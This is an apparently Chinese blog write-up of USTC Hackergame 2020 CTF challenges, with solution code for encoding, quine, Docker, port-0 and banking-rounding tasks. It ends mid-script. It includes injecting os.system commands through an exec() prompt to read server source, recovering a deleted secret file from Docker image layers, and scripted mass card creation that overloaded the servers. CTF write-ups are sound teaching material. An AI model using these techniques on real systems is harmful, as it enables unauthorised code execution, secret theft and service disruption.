npm 上这个能解析 <code>xlsx</code> 文件的 SheetJS、大写数字转小写的 nzh 还蛮好用的。Node.js 代码如下：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> XLSX = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'xlsx'</span>); <span class=\"hljs-comment\">// 解析 xlsx 用</span><span class=\"hljs-keyword\">const</span> NzhCN = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'nzh/cn'</span>); <span class=\"hljs-comment\">// 大写数字转小写</span><span class=\"hljs-keyword\">const</span> xlsx = XLSX.readFile(<span class=\"hljs-string\">'./bills.xlsx'</span>); <span class=\"hljs-comment\">// 当然你要先把 xlsx 文件下载下来</span><span class=\"hljs-keyword\">const</span> data = XLSX.utils.sheet_to_json(xlsx.Sheets[xlsx.SheetNames[<span class=\"hljs-number\">0</span>]]);<span class=\"hljs-keyword\">let</span> count = <span class=\"hljs-number\">0</span>;data.forEach(<span class=\"hljs-function\"><span class=\"hljs-params\">row</span> =&gt;</span> {  <span class=\"hljs-keyword\">const</span> moneyData = { <span class=\"hljs-attr\">yuan</span>: <span class=\"hljs-number\">0</span>, <span class=\"hljs-attr\">jiao</span>: <span class=\"hljs-number\">0</span>, <span class=\"hljs-attr\">fen</span>: <span class=\"hljs-number\">0</span> };  <span class=\"hljs-comment\">// nzh 不支持处理金额，需要自己实现一个</span>  <span class=\"hljs-keyword\">let</span> tmp;  [[<span class=\"hljs-string\">'元'</span>, <span class=\"hljs-string\">'yuan'</span>], [<span class=\"hljs-string\">'角'</span>, <span class=\"hljs-string\">'jiao'</span>], [<span class=\"hljs-string\">'分'</span>, <span class=\"hljs-string\">'fen'</span>]].forEach(<span class=\"hljs-function\">(<span class=\"hljs-params\">[i, dataKey]</span>) =&gt;</span> {    tmp = (tmp || row[<span class=\"hljs-string\">'单价'</span>]).split(i);    <span class=\"hljs-keyword\">if</span> (tmp.length === <span class=\"hljs-number\">1</span>) {      tmp = tmp[<span class=\"hljs-number\">0</span>]    } <span class=\"hljs-keyword\">else</span> {      moneyData[dataKey] = NzhCN.decodeB(tmp[<span class=\"hljs-number\">0</span>]);      tmp = tmp[<span class=\"hljs-number\">1</span>]    }  });  <span class=\"hljs-comment\">// 处理金额时，要小心浮点数大坑哟</span>  <span class=\"hljs-keyword\">const</span> value = moneyData.yuan * <span class=\"hljs-number\">100</span> + moneyData.jiao * <span class=\"hljs-number\">10</span> + moneyData.fen;  count = count + value * row[<span class=\"hljs-string\">'数量'</span>];});<span class=\"hljs-built_in\">console</span>.log(<span class=\"hljs-string\">`flag{<span class=\"hljs-subst\">${(count<span class=\"hljs-regexp\">/100).toFixed(2)}}`); /</span><span class=\"hljs-regexp\">/ 直接打印 flag</span></span></span></code></pre>\n<h2>超简单的世界模拟器</h2>\n<blockquote>\n<p>……</p>\n<p>你的任务是在生命游戏的世界中，复现出蝴蝶扇动翅膀，引起大洋彼岸风暴的效应。</p>\n<p>通过改变左上角 15x15 的区域，在游戏演化 200 代之后，如果被特殊标注的正方形内的细胞被“清除”，你将会得到对应的 flag：</p>\n<p>“清除”任意一个正方形，你将会得到第一个 flag。同时“清除”两个正方形，你将会得到第二个 flag。</p>\n</blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.5/26.png\" width=\"919\" height=\"936\" class=\"lazy post-img\"></p>\n<p>在 Google 上搜索「生命游戏」，找到了一个知乎提问和 <a href=\"https://www.conwaylife.com/wiki/Main_Page\">Conway Life Game Wiki</a>。大概了解康威生命游戏是什么后就理解了题目的要求：要在 15x15 的范围内构建一个生命游戏图形、在演化到 200 代之后会清除两个种群。</p>\n<p>第一个 Payload 是一艘最简单的会向右平移「飞船」（这个图形在知乎或是 Life Game Wiki 上都可以被轻易找到），可以直接摧毁第一个种群：</p>\n<pre><code class=\"hljs plaintext\">00000110111101101100011</code></pre>\n<p>第二个 Payload 是我一不小心试出来的，由一个平移的「飞船」和一个沿着斜对角线行走的「滑翔者」共同组成，他们会「擦弹」引发「大爆炸」，在 80 代左右摧毁第一个种群、在 160 代左右摧毁第二个种群：</p>\n<pre><code class=\"hljs plaintext\">0000011011110110110001100001101011</code></pre>\n<h2>从零开始的火星文生活</h2>\n<blockquote>\n<p>……</p>\n<p>L 同学打开附件一看，傻眼了，全都是意义不明的汉字。机智的 L 同学想到 Q 同学平时喜欢使用 <strong>GBK 编码</strong>，也许是打开方式不对。结果用 GBK 打开却看到了一堆夹杂着日语和数字的<strong>火星文</strong>……</p>\n<p>L 同学彻底懵逼了，几经周折，TA 找到了科大最负盛名的火星文专家 (你)。依靠多年的字符编码解码的经验，你可以破译 Q 同学发来的火星文是什么意思吗？</p>\n<p>注：正确的 flag 全部由 <strong>ASCII</strong> 字符组成！</p>\n</blockquote>\n<p>这种 GBK、UTF-8 之间的火星文编码问题，直接给一个 Unix 下的 <strong>万能解法</strong>：</p>\n<pre><code class=\"hljs bash\">cat gibberish_message.txt | iconv -f utf8 -t gbk | iconv -f utf8 -t latin1 | iconv -f gbk -t utf8</code></pre>\n<p>剩下要做的，就是把全角转换成半角了。</p>\n<h2>自复读的复读机</h2>\n<blockquote>\n<p>能够复读其他程序输出的程序只是普通的复读机。</p>\n<p>顶尖的复读机还应该能复读出自己的源代码。</p>\n<p>什么是国际复读机啊（战术后仰）</p>\n<p>你现在需要编写两个只有一行 Python 代码的顶尖复读机：</p>\n<ul>\n<li>其中一个要输出代码本身的逆序（即所有字符从后向前依次输出）</li>\n<li>另一个是输出代码本身的 sha256 哈希值，十六进制小写</li>\n</ul>\n<p>满足两个条件分别对应了两个 flag。</p>\n<p>快来开始你的复读吧~</p>\n</blockquote>\n<p>访问题目，输出的提示信息是：</p>\n<pre><code class=\"hljs plaintext\">Your one line python code to exec():</code></pre>\n<p>什么，可以 <code>exec()</code> 啊？那大尾巴狐狸直接干坏事了：</p>\n<pre><code class=\"hljs plaintext\">Your one line python code to exec(): import os; os.system(\"ls\")</code></pre>\n<p>发现目录下面有一个 <code>checker.py</code> 和一个 <code>runner.py</code>。接着用 <code>os.system(\"cat *.py\")</code> 获得题目源码：</p>\n<pre><code class=\"hljs python\"><span class=\"hljs-comment\"># checker.py</span><span class=\"hljs-keyword\">import</span> subprocess<span class=\"hljs-keyword\">import</span> hashlib<span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">\"__main__\"</span>:    code = <span class=\"hljs-built_in\">input</span>(<span class=\"hljs-string\">\"Your one line python code to exec(): \"</span>)    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-keyword\">if</span> <span class=\"hljs-keyword\">not</span> code:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Code must not be empty\"</span>)        exit(-<span class=\"hljs-number\">1</span>)    p = subprocess.run(        [<span class=\"hljs-string\">\"su\"</span>, <span class=\"hljs-string\">\"nobody\"</span>, <span class=\"hljs-string\">\"-s\"</span>, <span class=\"hljs-string\">\"/bin/bash\"</span>, <span class=\"hljs-string\">\"-c\"</span>, <span class=\"hljs-string\">\"/usr/local/bin/python3 /runner.py\"</span>],        <span class=\"hljs-built_in\">input</span>=code.encode(),        stdout=subprocess.PIPE,    )    <span class=\"hljs-keyword\">if</span> p.returncode != <span class=\"hljs-number\">0</span>:        <span class=\"hljs-built_in\">print</span>()        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Your code did not run successfully\"</span>)        exit(-<span class=\"hljs-number\">1</span>)    output = p.stdout.decode()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Your code is:\"</span>)    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">repr</span>(code))    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Output of your code is:\"</span>)    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">repr</span>(output))    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Checking reversed(code) == output\"</span>)    <span class=\"hljs-keyword\">if</span> code[::-<span class=\"hljs-number\">1</span>] == output:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">\"/root/flag1\"</span>).read())    <span class=\"hljs-keyword\">else</span>:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Failed!\"</span>)    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Checking sha256(code) == output\"</span>)    <span class=\"hljs-keyword\">if</span> hashlib.sha256(code.encode()).hexdigest() == output:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">\"/root/flag2\"</span>).read())    <span class=\"hljs-keyword\">else</span>:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Failed!\"</span>)<span class=\"hljs-comment\"># runner.py</span><span class=\"hljs-built_in\">exec</span>(<span class=\"hljs-built_in\">input</span>())</code></pre>\n<blockquote><p>不要想着直接 <code>exec()</code> 偷 flag 了，你以为这比赛是 ylb 搞的啊？</p></blockquote>\n<p>可以看到「反向复读」的检查中使用了 <code>[::-1]</code> 倒序，所以在构造反向复读的语句中也应该使用 <code>[::-1]</code>。</p>\n<p>首先是构建正向复读的语句，在 Google 中 <del>盲目</del> 搜索的过程中确定了关键词「Quine Python」、找到了 <a href=\"https://www.geeksforgeeks.org/quine-in-python/\">这个网站</a>，介绍了如下语句：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">'_=%r;print (_%%_)'</span>;<span class=\"hljs-built_in\">print</span> (_%_)</code></pre>\n<p>那个网站也给出了这个语句的详细解释，不过简单来说，我们利用了 <code>print</code> 字符格式化、通过 <code>%r</code>（当然也可以用 <code>%s</code>）获得 <code>_</code> 变量的取值；而在 <code>_</code> 变量中使用了 <code>%%</code> 防止 <code>%</code> 被转义。</p>\n<p>既然有了正向复读，稍加改动即可得到反向复读。首先在 <code>print(_&amp;_)</code> 中加上 <code>[::-1]</code> 获得倒叙，同时也要对应修改 <code>_</code> 变量：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">')]1-::[_%%_(tnirp;%r=_'</span>;<span class=\"hljs-built_in\">print</span>(_%_[::-<span class=\"hljs-number\">1</span>])</code></pre>\n<p>信心满满地去提交，结果 Check Failed，发现 <code>print</code> 在结尾带上了换行符。所以再为 <code>print</code>再加上 <code>end=\"\"</code> 即可：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">')\"\"=dne,]1-::[_%%_(tnirp;%r=_'</span>;<span class=\"hljs-built_in\">print</span>(_%_[::-<span class=\"hljs-number\">1</span>],end=<span class=\"hljs-string\">\"\"</span>)</code></pre>\n<p>成功获得第一个 flag。</p>\n<h2>233 同学的字符串工具</h2>\n<blockquote>\n<p>233 同学最近刚刚学会了 Python 的字符串操作，于是写了两个小程序运行在自己的服务器上。这个工具提供两个功能：</p>\n<ul>\n<li>字符串大写工具</li>\n<li>UTF-7 到 UTF-8 转换工具</li>\n</ul>\n<p>除了点击下方的打开题目按钮使用网页终端，你也可以通过 <code>nc 202.38.93.111 10233</code> 命令连接到 233 同学的服务上。你可以在这里看到 233 同学的源代码: <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-string_tool-py\">string_tool.py</a>。</p>\n</blockquote>\n<p>这一道题我先拿到了第二个 flag 后才拿到了第一个 flag。首先在 <code>www.string-function.com</code> 这个网站上找到了 UTF-7 和 ASCII 编码互换表： <a href=\"http://string-functions.com/encodingtable.aspx?encoding=65000&amp;decoding=20127\">UTF-7 =&gt; ASCII</a> <a href=\"http://string-functions.com/encodingtable.aspx?encoding=20127&amp;decoding=65000\">ASCII =&gt; UTF-7</a>，照着表（加上一些简单的推算）将 <code>flag</code> 编码成 <code>+AGYAbABhAGc-</code>、成功拿到第二个 flag。</p>\n<p>获得第二个 flag 以后，决定根据相同的思路去查 Unicode sheet，但是直到后来经过提醒才想起来有「<a href=\"https://en.wikipedia.org/wiki/Orthographic_ligature\">合字</a>」这种神奇的存在，最终利用 <a href=\"https://www.compart.com/en/unicode/U+FB02#UNC_DB\"><code>U+FB02</code></a> 构造出 Payload 获得第一个 flag。</p>\n<h2>233 同学的 Docker</h2>\n<blockquote>\n<p>233 同学在软工课上学到了 Docker 这种方便的东西，于是给自己的字符串工具项目写了一个 Dockerfile。</p>\n<p>但是 233 同学突然发现它不小心把一个私密文件（<code>flag.txt</code>）打包进去了，于是写了一行命令删掉这个文件。</p>\n<p>「既然已经删掉了，应该不会被人找出来吧？」233 想道。</p>\n</blockquote>\n<p>首先让我们 <a href=\"https://hub.docker.com/layers/8b8d3c8324c7/stringtool/latest/images/sha256-aef87a00ad7a4e240e4b475ea265d3818c694034c26ec227d8d4f445f3d93152?context=explore\">看看这个 Docker Image 是怎么构建的</a>（不需要用 image 反推 Dockerfile 这种奇技淫巧，DockerHub 可以直接查看 Public 的 Docker Images 的构建过程），可以发现 233 同学首先把所有文件都添加到 Docker Image 中、再通过 <code>/bin/sh -c rm /code/flag.txt</code> 删除了 <code>flag.txt</code>。</p>\n<p>由于 Docker Image 在构建时每一个 RUN 都会新建一个 Layer，因此即使 233 同学通过 RUN 删掉了 <code>flag.txt</code>，flag 肯定还存在于某个地方，而且「某个地方」就包括本机的 <code>/var/lib/docker/overlay2</code> ：</p>\n<pre><code class=\"hljs bash\">$ docker run 8b8d3c8324c7/stringtool <span class=\"hljs-comment\"># 下载执行 8b8d3c8324c7/stringtool</span>[Redacted]Nothing here... <span class=\"hljs-comment\"># Docker Image 执行的输出</span>$ <span class=\"hljs-built_in\">cd</span> /var/lib/docker/overlay2$ find -name flag.txt./befaa134f7d0cc9e964e7790b7c11dde6d0df3104cd88667f7676e46f409705f/diff/code/flag.txt./8c07cc3c01c52b8cf0684518e68a31bfb1f843392f973fef9add587d554c6fab/diff/code/flag.txt<span class=\"hljs-comment\"># Duang，flag.txt 它出现了</span>$ <span class=\"hljs-built_in\">cd</span> befaa134f7d0cc9e964e7790b7c11dde6d0df3104cd88667f7676e46f409705f/diff/code/$ cat flag.txt<span class=\"hljs-comment\"># flag 到手，嘿嘿</span></code></pre>\n<h2>从零开始的 HTTP 链接</h2>\n<blockquote>\n<p>众所周知，数组下标应当从 0 开始。</p>\n<p>同样的，TCP 端口也应当从 0 开始。为了实践这一点，我们把一个网站架设在服务器的 0 号端口上。</p>\n<p>你能成功连接到 0 号端口并拿到 flag 吗？</p>\n<p><strong>点击下面的打开题目按钮是无法打开网页的，因为普通的浏览器会认为这是无效地址。</strong></p>\n</blockquote>\n<p>TCP/IP 中「端口」这个概念，甚至早于互联网的发明：早在 ARPANET 网中的供电协议中就有 8 个比特用于决定应该由计算机上的哪个程序接收该信息（当时这 8 个比特被称为 AEN、Another Eight Numbers），可以参考我之前翻译的一篇文章「<a href=\"https://blog.skk.moe/post/history-of-url/\">URL 的历史</a>」。现在 TCP 的端口共有 16 个比特（最大支持到 65535）。其中，端口 0 作为保留端口，所以依然是可用的。虽然部分浏览器无法访问，这并不意味着 netcat 不能访问，对吧！</p>\n<p>当然这道题有几个坑点：</p>\n<ol>\n<li>现有发行版中分发的 <code>netcat</code> 都不是「原版」的，试图连接 Port 0 会报「Invalid Port」。因此可以选择直接手撸 Socket、或者更换另一个版本的 <code>netcat</code>。</li>\n<li>就算使用了合适的工具，由于 Darwin 的 XNU Kernel 非常鸡贼地阻止使用端口 0，所以在 macOS 上也依然没法做这道题。我不得不在 codeanywhere 上开了一个 Linux Container 跑这道题。</li>\n</ol>\n<p>和 HTTP/2 基于二进制帧不同，HTTP/0.9、HTTP/1.0、HTTP/1.1 协议都是基于明文的，因此可以手敲 Header：</p>\n<pre><code class=\"hljs bash\">nc 202.38.93.111 0GET / HTTP/1.1Host: 202.38.93.111Connection: close</code></pre>\n<p>接着终端里会打印出来一串 HTML、隐约还可以看见 <code>xterm.js</code>，这不就是 Hackergame 的 Web 端做题界面嘛！由于去年在参与 USTC Hackergame 时就研究过这个界面、已经知道交互是通过 <code>/shell</code> 路径下的 WebSocket 连接实现的。因此直接使用 <a href=\"https://github.com/vi/websocat\">websocat</a> 完成 WebSocket 交互，就和 netcat 一样：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 如果没有 websocat 的话</span>$ wget https://github.com/vi/websocat/releases/download/v1.6.0/websocat_nossl_amd64-linux$ chmod +x websocat_nossl_amd64-linux<span class=\"hljs-comment\"># 开始获取 Flag</span>$ ./websocat_nossl_amd64-linux ws://202.38.93.111:0/shellPlease input your token: [Redacted]<span class=\"hljs-comment\"># Flag 到手！</span></code></pre>\n<h2>超简陋的 OpenGL 小程序</h2>\n<blockquote>\n<p>年轻人的第一个 OpenGL 小程序。</p>\n<p>（嗯，有什么被挡住了？）</p>\n</blockquote>\n<p><a href=\"https://archive.org/details/glhackergame_2020\">下载地址</a> （Hosted at Internet Archive）</p>\n<p>由于苏卡卡是参赛的两千多名选手中最菜的那一个、完全不懂 OpenGL、完全不懂图形学，为了做这道题不得不去翻了一下「Learn OpenGL CN」，知道了 VS（Vertex Shader）是顶点着色器、可以处理顶点属性确定形状，和 FS（Fragment Shader）是片段着色器、可以算颜色，然后就开始硬上了。在花了半个小时盲目乱改 VS 的参数后，成功让「犹抱琵琶半遮面」的 flag 露出了右上角：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/16.jpg\" width=\"1280\" height=\"571\" class=\"lazy post-img\"></p>\n<p>凭借着漏出来的部分，我成功认出了 <code>l</code>、<code>Graphic</code>、<code>Happy</code>、<code>(233);</code>。剩下的就要靠猜了，我猜过的 flag 有：</p>\n<ul>\n<li>\n<code>flag{GraphicHappy(223);}</code> （整体长度都不对）</li>\n<li>\n<code>flag{GraphicsHappy(223);}</code> （ <code>c</code> 和 <code>H</code> 之间还有个类似 <code>c</code> 的字母、那就是 <code>s</code> 了，不过还是不够长）</li>\n<li>\n<code>flag{gl_GraphicsHappy(223);}</code> （OpenGL 里不少 <code>gl_</code> 前缀，加上认出来一个 <code>l</code>，试试看）</li>\n<li>\n<code>flag{glGraphicsHappy(223);}</code> （<code>l</code> 和 <code>G</code> 之间的距离没那么长，终于猜对了）</li>\n</ul>\n<blockquote><p>这道题的正确解法是利用未被使用的向量 <code>Normal</code>。苏卡卡虽然有注意到 Normal 未被使用过，但是由于完全不会 OpenGL、并不知道怎么添加向量。</p></blockquote>\n<p>这种解法没什么好自豪的，你看这只大尾巴狐狸就是逊啦。</p>\n<h2>来自未来的信笺</h2>\n<blockquote>\n<p>你收到了一封邮件。没有标题，奇奇怪怪的发件人，和一份奇怪的附件。日期显示的是 3020 年 10 月 31 日。</p>\n<p>“Send from Arctic.” 正文就只有这一句话。</p>\n<p>「谁搞的恶作剧啊……话说这竟然没有被垃圾邮件过滤器过滤掉？」你一边嘟囔着一边解压了附件——只看到一堆二维码图片。</p>\n<p>看起来有点意思。你不禁想试试，能否从其中得到什么有意义的东西。</p>\n</blockquote>\n<p>谁会在 1000 年以后从北极给你发一封电子邮件？那当然是 <a href=\"https://archiveprogram.github.com/\">GitHub Archive Program</a> 啦 —— 今年年初，GitHub 将现存的活跃开源项目全部以二维码的形式刻录在胶片上、埋进了北极世界档案馆（AWA，位于斯瓦尔巴群岛一个位于北极冻土之下的废弃煤矿中，和 Global Seed Vault 仅一英里之遥）中。为了做这道题，让我们读一读 GitHub Archive Program 为「后人」提供的指南：</p>\n<ul>\n<li><p>「<a href=\"https://github.com/github/archive-program/blob/master/GUIDE.md\">A Guide To the GitHub Code Vault</a>」</p></li>\n<li><p>「<a href=\"https://github.com/github/archive-program/blob/master/GUIDE_zh.md\">GitHub Code Vault 指南（简体中文）</a>」</p></li>\n</ul>\n<p>这里摘抄简体中文版指南的一部分内容：</p>\n<blockquote>\n<p>每个二维码由一个个白色或黑色小方块组成，该等小方块几乎占据胶片的整个帧。 使用二维码的原因在于，其比人类可读的文本更紧凑而可靠。 二维码可解码为二进制数据，即一系列 1 和 0。</p>\n<p>……</p>\n<p>我们可将 TAR 文件嵌套进 TAR 文件，就像在容器中装入另一容器，而这正是大部分存档数据的存储方式。 无论哪个仓库，其外层 TAR 文件都将至少包含如下内容：</p>\n<ul>\n<li>一个名为 META 的未压缩元数据文件，其包含仓库名称、帐户名、说明、语言、星数、复刻数</li>\n<li>一个名为 COMMITS 的压缩文件（如下所述），包含该仓库有史以来的更改记录</li>\n<li>一个名为 repo.tar.xz 的文件，是包含实际仓库内容的压缩 TAR 文件</li>\n</ul>\n<p>其它诸如 wiki、gh-page、issue 和 pull request 等元数据也可能包含在不同压缩文件中。</p>\n</blockquote>\n<p>现在我们知道了这些二维码是什么、二维码们中存储了什么数据、数据的格式，接下来就该写一个脚本把所有二维码全部解析出来了：</p>\n<pre><code class=\"hljs python\"><span class=\"hljs-keyword\">import</span> zxing<span class=\"hljs-keyword\">import</span> osreader = zxing.BarCodeReader()<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">parseQRCode</span>(<span class=\"hljs-params\">img_path</span>):</span>    barcode = reader.decode(img_path).encode().decode(<span class=\"hljs-string\">'ascii'</span>)    <span class=\"hljs-keyword\">try</span>:        <span class=\"hljs-keyword\">return</span> barcode.raw    <span class=\"hljs-keyword\">except</span>:        <span class=\"hljs-built_in\">print</span>(img_path, barcode)        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">\"\"</span><span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">listDirImages</span>(<span class=\"hljs-params\">folder</span>):</span>    imgs = []    <span class=\"hljs-keyword\">for</span> img_path <span class=\"hljs-keyword\">in</span> os.listdir(folder):        ext = os.path.splitext(img_path)        <span class=\"hljs-keyword\">if</span> <span class=\"hljs-built_in\">len</span>(ext) &gt; <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> ext[<span class=\"hljs-number\">1</span>].lower() == <span class=\"hljs-string\">\".png\"</span>:            imgs.append(img_path)    imgs.sort()    <span class=\"hljs-keyword\">return</span> imgscontents = []<span class=\"hljs-keyword\">for</span> img <span class=\"hljs-keyword\">in</span> listDirImages(<span class=\"hljs-string\">\"./\"</span>):    contents.extend(parseQRCode(img))file = <span class=\"hljs-string\">\"./result.txt\"</span><span class=\"hljs-keyword\">with</span> <span class=\"hljs-built_in\">open</span>(file, <span class=\"hljs-string\">\"w\"</span>) <span class=\"hljs-keyword\">as</span> f:    <span class=\"hljs-keyword\">for</span> c <span class=\"hljs-keyword\">in</span> contents:        f.write(c)</code></pre>\n<blockquote><p>这道题对二维码解码库的选择非常关键。<code>zybar</code> 已经八年没有更新，不仅无法处理 Binary Format QRCode、而且还无法识别 00 截断；相比来说，<code>zxing</code> 库的维护非常活跃、因而更为可靠。不过即使使用 py-zxing 也有坑，很快就会看到了。</p></blockquote>\n<p>把脚本丢到二维码目录下执行，跑完了打开 <code>result.txt</code>，看到了 <code>META</code>（一个 <code>openlug/django-common</code> 的 GitHub RESTful API 返回值）、<code>COMMITS</code>，甚至还看到了一条 commit message「There’s no flag in META and COMMITS!」。但是到了 <code>repo.tar.xz</code> 却让我伤破脑筋：zlib 的文件头本应该是 <code>FD 37 7A 58</code>，结果却看到了 <code>EF BF BD 37 7A 58</code>，解压软件一个都认不出来。</p>\n<p>这是啥玩意？遇事不决问 Google，结果找到了这个：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/20.png\" width=\"829\" height=\"601\" class=\"lazy post-img\"></p>\n<blockquote><p>[狐狐脏话删除]</p></blockquote>\n<p>接下来就是去魔改 zxing 了。如之前所说，python-zxing 还只是个 Java zxing 的 wrapper，不得不去学了一点 Java 把 zxing 里的 UTF-8 干掉，最终重新解析了一遍二维码、拿到了正确的 <code>repo.tar.xz</code>，解压拿到了 flag。</p>\n<blockquote><p>顺便说一句，做完这道题后有点无聊，开始通过 META 反推原始仓库。原本看到 <code>openlug/nonexist</code>，以为出题人是新建了一个 Private Repo 出的题，但是又看到 <code>fork_count</code> 和 <code>network_count</code> 是 5，所以得出结论这肯定是一个 Public Repo（否则不可能有 Fork）。再根据 Star 数在 30 左右、Watch 数（在 GitHub RESTful API 中通过 <code>subscriber_count</code> 呈现）是 1、语言是 Python， 最后反推出 META 信息源自去年「被泄露的姜戈」的 <code>openlug/django-common</code>，生成 META 的方式就是 <code>curl https://api.github.com/repos/openlug/django-common</code>。结果还被组委会 diss 了，大尾巴狐狐非常不高兴。</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.0/32.png\" width=\"1067\" height=\"247\" class=\"lazy post-img\"></p>\n<h2>狗狗银行</h2>\n<blockquote><p>你能在狗狗银行成功薅到羊毛吗？</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/6.png\" width=\"1009\" height=\"593\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/7.png\" width=\"988\" height=\"581\" class=\"lazy post-img\"></p>\n<p>考虑到题目公告更新提示「本题前端计算存在浮点数导致的计算误差，数字特别极端时显示可能不正确。但后端采用大整数精确计算，只有净资产确实高于 2000 时才会给出 flag」，所以这道题的思路和 前年 USTC Hackergame 2018 的猫咪银行借助 INT64 溢出 肯定是不一样的。</p>\n<p>首先观察题目给出的条件：每天都要花 10 块钱吃饭；信用卡利率 0.5%、并且一旦欠款每天利息至少是 10 块钱；储蓄卡利率 0.3%。光从字面上的数字来看似乎这道题做不出来，但是我们知道，阿里蚂蚁金服的「余额宝」产品存在「每天收益不足 1 分钱时按 1 分钱计算」的规则。狗狗银行的储蓄卡利率是否也有类似的规则呢？办一张新的「储蓄卡 3」，从「储蓄卡 1」转 166 块钱到「储蓄卡 3」，「储蓄卡 3」的日利息仍然是 0；再从「储蓄卡 1」转 1 块钱到「储蓄卡 3」使余额变成 167 块，Bingo！现在「储蓄卡 3」的日利息有 1 块钱了。<code>1 / 167</code> 算出来真实的日利率是 0.5988%，比信用卡的利率要高 0.0988%，因此我们可以从信用卡借钱然后赚利息的差价，当然还要考虑到每天至少要净赚 10 块的饭钱、以及信用卡的复利（利滚利）。</p>\n<p>接下来就是用脚本连续开一万张卡试图一天拿到 flag，然后，三台备用服务器（一个 IP 上三个端口、三个 Docker）全部 RST 了。。。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/13.png\" width=\"782\" height=\"905\" class=\"lazy post-img\"></p>\n<p>之后，题目新增了一条公告：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/15.png\" width=\"690\" height=\"94\" class=\"lazy post-img\"></p>\n<p>苏卡卡才不是故意的呢（摇尾巴），<del>苏卡卡只是坏，一天赚 1000 不香嘛</del>；虽然有了 1000 张卡的限制，获取 flag 还是轻而易举的：</p>\n<pre><code class=\"hljs js\">(<span class=\"hljs-keyword\">async</span> () =&gt; {  <span class=\"hljs-keyword\">const</span> commonFetchOpt = {    <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'POST'</span>, <span class=\"hljs-attr\">mode</span>: <span class=\"hljs-string\">'cors'</span>, <span class=\"hljs-attr\">credentials</span>: <span class=\"hljs-string\">'include'</span>,    <span class=\"hljs-attr\">headers</span>: {      <span class=\"hljs-attr\">Authorization</span>: <span class=\"hljs-string\">'Bearer [选手 Token]'</span>,      <span class=\"hljs-string\">'Content-Type'</span>: <span class=\"hljs-string\">'application/json; charset=utf-8'</span>    }  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{'credit'|'debit'}</span> <span class=\"hljs-variable\">type</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">createCard</span>(<span class=\"hljs-params\">type = <span class=\"hljs-string\">'debit'</span></span>) </span>{    <span class=\"hljs-keyword\">return</span> fetch(<span class=\"hljs-string\">'/api/create'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ type }),      ...commonFetchOpt    });  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">from</span></span></span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">to</span></span></span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">amount</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">transfer</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">from</span>, to, amount</span>) </span>{    <span class=\"hljs-keyword\">return</span> fetch(<span class=\"hljs-string\">'/api/transfer'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ amount, <span class=\"hljs-attr\">dst</span>: to, <span class=\"hljs-attr\">src</span>: <span class=\"hljs-keyword\">from</span> }),      ...commonFetchOpt    });  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">account</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-keyword\">async</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">eatAndEndTheDay</span>(<span 